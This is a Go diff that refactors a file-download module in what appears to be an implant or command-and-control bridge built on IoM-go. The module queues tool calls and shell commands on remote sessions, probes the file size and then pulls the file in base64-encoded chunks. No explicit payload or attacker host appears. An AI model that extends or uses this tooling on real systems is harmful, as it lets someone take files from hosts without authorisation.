@@ -4,7 +4,6 @@ import (
 	"crypto/sha256"
 	"encoding/hex"
 	"fmt"
-	"time"
 
 	"github.com/chainreactors/IoM-go/consts"
 	"github.com/chainreactors/IoM-go/proto/implant/implantpb"
@@ -19,8 +18,6 @@ type DownloadModule struct{}
 func (m *DownloadModule) Name() string { return consts.ModuleDownload }
 
 func (m *DownloadModule) Handle(ctx ModuleContext, sessionID string, taskID uint32, spite *implantpb.Spite) {
-	ctx.Tasks.Create(sessionID, taskID, m.Name())
-
 	dReq := spite.GetDownloadRequest()
 	if dReq == nil {
 		ctx.SendSpite(sessionID, taskID, execSpite("missing DownloadRequest"))
@@ -28,7 +25,7 @@ func (m *DownloadModule) Handle(ctx ModuleContext, sessionID string, taskID uint
 		return
 	}
 
-	sess := ctx.WaitForSession(sessionID, 30*time.Second)
+	sess := ctx.WaitForSession(sessionID, DefaultSessionTimeout)
 	if sess == nil {
 		log.Warnf("[bridge] session %s not found for download injection", sessionID)
 		ctx.Tasks.Fail(sessionID, taskID, "session not found")
@@ -56,24 +53,9 @@ func (m *DownloadModule) handleDirectDownload(ctx ModuleContext, sessionID strin
 	}
 
 	args := sessions.BuildReadArguments(sess, toolName, filePath)
-	cmdID := sessions.GenerateCommandID()
-
-	action := &sessions.PendingAction{
-		ID:        cmdID,
-		TaskID:    taskID,
-		Type:      sessions.ActionToolCall,
-		ToolName:  toolName,
-		Arguments: args,
-		CreatedAt: time.Now(),
-	}
-
-	if !sessions.Global().EnqueueAction(sessionID, action) {
-		log.Errorf("[bridge] failed to enqueue direct download for session %s", sessionID)
-		ctx.Tasks.Fail(sessionID, taskID, "enqueue failed")
+	if _, ok := enqueueToolAction(ctx, sessionID, taskID, toolName, args); !ok {
 		return
 	}
-
-	ctx.Tasks.BindCommand(sessionID, taskID, cmdID)
 	log.Infof("[bridge] enqueued direct download task %d for session %s: %s", taskID, sessionID, filePath)
 
 	ch := ctx.Tasks.AwaitResult(sessionID, taskID)
@@ -95,24 +77,10 @@ func (m *DownloadModule) handleDirectDownload(ctx ModuleContext, sessionID strin
 func (m *DownloadModule) probeAndDownload(ctx ModuleContext, sessionID string, taskID uint32, sess *sessions.Session, shellTool, filePath string) {
 	// Enqueue file-size probe.
 	probeCmd := sessions.FileSizeProbeCommand(filePath)
-	probeCmdID := sessions.GenerateCommandID()
-
-	action := &sessions.PendingAction{
-		ID:        probeCmdID,
-		TaskID:    taskID,
-		Type:      sessions.ActionToolCall,
-		ToolName:  shellTool,
-		Arguments: sessions.BuildCommandArguments(sess, shellTool, probeCmd),
-		CreatedAt: time.Now(),
-	}
-
-	if !sessions.Global().EnqueueAction(sessionID, action) {
-		log.Errorf("[bridge] failed to enqueue file size probe for session %s", sessionID)
-		ctx.Tasks.Fail(sessionID, taskID, "probe enqueue failed")
+	probeArgs := sessions.BuildCommandArguments(sess, shellTool, probeCmd)
+	if _, ok := enqueueToolAction(ctx, sessionID, taskID, shellTool, probeArgs); !ok {
 		return
 	}
-
-	ctx.Tasks.BindCommand(sessionID, taskID, probeCmdID)
 
 	// Wait for probe result via TaskManager fan-out.
 	ch := ctx.Tasks.AwaitResult(sessionID, taskID)
@@ -139,17 +107,7 @@ func (m *DownloadModule) probeAndDownload(ctx ModuleContext, sessionID string, t
 		readTool := sessions.PickReadTool(sess)
 		if readTool != "" {
 			args := sessions.BuildReadArguments(sess, readTool, filePath)
-			cmdID := sessions.GenerateCommandID()
-			readAction := &sessions.PendingAction{
-				ID:        cmdID,
-				TaskID:    taskID,
-				Type:      sessions.ActionToolCall,
-				ToolName:  readTool,
-				Arguments: args,
-				CreatedAt: time.Now(),
-			}
-			if sessions.Global().EnqueueAction(sessionID, readAction) {
-				ctx.Tasks.BindCommand(sessionID, taskID, cmdID)
+			if _, ok := enqueueToolAction(ctx, sessionID, taskID, readTool, args); ok {
 				log.Infof("[bridge] enqueued direct read after probe for session %s: %s", sessionID, filePath)
 				m.waitForReadResult(ctx, sessionID, taskID, ch)
 				return
@@ -195,23 +153,10 @@ func (m *DownloadModule) waitForReadResult(ctx ModuleContext, sessionID string, 
 }
 
 func (m *DownloadModule) executeSingleShell(ctx ModuleContext, sessionID string, taskID uint32, shellTool string, sess *sessions.Session, shellCmd string, ch <-chan *sessions.CommandResult) {
-	cmdID := sessions.GenerateCommandID()
-	action := &sessions.PendingAction{
-		ID:        cmdID,
-		TaskID:    taskID,
-		Type:      sessions.ActionToolCall,
-		ToolName:  shellTool,
-		Arguments: sessions.BuildCommandArguments(sess, shellTool, shellCmd),
-		CreatedAt: time.Now(),
-	}
-
-	if !sessions.Global().EnqueueAction(sessionID, action) {
-		log.Errorf("[bridge] failed to enqueue single shell download for session %s", sessionID)
-		ctx.Tasks.Fail(sessionID, taskID, "enqueue failed")
+	args := sessions.BuildCommandArguments(sess, shellTool, shellCmd)
+	if _, ok := enqueueToolAction(ctx, sessionID, taskID, shellTool, args); !ok {
 		return
 	}
-
-	ctx.Tasks.BindCommand(sessionID, taskID, cmdID)
 
 	if result, ok := awaitTaskResult(ch, taskID); ok {
 		decoded, err := sessions.DecodeBase64Output(result.Output)
@@ -232,23 +177,10 @@ func (m *DownloadModule) executeChunks(ctx ModuleContext, sessionID string, task
 	var assembled []byte
 
 	for i, chunk := range chunks {
-		cmdID := sessions.GenerateCommandID()
-		action := &sessions.PendingAction{
-			ID:        cmdID,
-			TaskID:    taskID,
-			Type:      sessions.ActionToolCall,
-			ToolName:  shellTool,
-			Arguments: sessions.BuildCommandArguments(sess, shellTool, chunk.Command),
-			CreatedAt: time.Now(),
-		}
-
-		if !sessions.Global().EnqueueAction(sessionID, action) {
-			log.Errorf("[bridge] failed to enqueue download chunk %d/%d for session %s", i+1, len(chunks), sessionID)
-			ctx.Tasks.Fail(sessionID, taskID, "chunk enqueue failed")
+		args := sessions.BuildCommandArguments(sess, shellTool, chunk.Command)
+		if _, ok := enqueueToolAction(ctx, sessionID, taskID, shellTool, args); !ok {
 			return
 		}
-
-		ctx.Tasks.BindCommand(sessionID, taskID, cmdID)
 		log.Infof("[bridge] enqueued download chunk %d/%d for session %s", i+1, len(chunks), sessionID)
 
 		// Wait for chunk result.
